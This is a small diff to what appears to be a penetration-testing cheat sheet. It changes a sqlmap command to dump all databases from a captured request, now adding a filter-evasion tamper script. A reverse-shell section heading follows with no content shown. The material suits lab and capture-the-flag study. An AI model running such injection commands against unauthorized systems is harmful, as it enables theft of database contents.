@@ -40,7 +40,7 @@
 - e.g http://10.0.0.1/?id=2
 - use burp to get the request page and save it as req.txt
 - then run
-- `sqlmap -r req.txt --dbms --dump-all`
+- `sqlmap -r req.txt --tamper=space2comment --dump-all --dbms mysql`
 
 ### msfvenom and msfconsole reverse shell
 
